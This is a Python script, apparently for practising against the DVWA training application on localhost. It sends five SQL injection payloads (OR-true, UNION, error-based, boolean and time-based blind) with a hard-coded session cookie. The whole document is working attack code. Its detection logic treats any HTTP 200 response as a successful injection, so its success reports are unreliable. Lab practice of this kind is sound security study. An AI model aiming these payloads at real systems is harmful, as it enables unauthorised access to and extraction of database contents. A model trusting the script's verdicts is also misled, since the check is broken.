import requests

# Adjust the URL to point to the correct DVWA path
url = 'http://127.0.0.1/index.php'

# Replace with your actual session cookies from DVWA
cookies = {
    'PHPSESSID': "b6sfs6mdktjd2ac9maq44etjq7",  
    'security': 'low'  # Ensure the security level matches the one set in DVWA
}

# List of payloads to test different types of SQL Injection
payloads = {
    "Classic ' OR '1'='1": "' OR '1'='1",
    "Union-based": "' UNION SELECT null, database()-- ",
    "Error-based": "' AND 1=CONVERT(int, (SELECT @@version))-- ",
    "Boolean-based Blind": "' AND 1=1-- ",
    "Time-based Blind": "' AND SLEEP(5)-- "
}

# Loop through each payload and test SQL injection
for name, payload in payloads.items():
    data = {
        'id': payload,
        'Submit': 'Submit'
    }

    try:
        response = requests.post(url, cookies=cookies, data=data, timeout=10)

        # Check response content or status code for more detailed analysis
        if 'User ID exists in the database' in response.text or response.status_code == 200:
            print(f"SQL Injection successful with {name}: {payload}")
            print(f"Vulnerability Type: SQL Injection")
        else:
            print(f"SQL Injection unsuccessful with {name}: {payload}")
            print(f"Vulnerability Type: SQL Injection")
        
        print("-" * 50)

    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
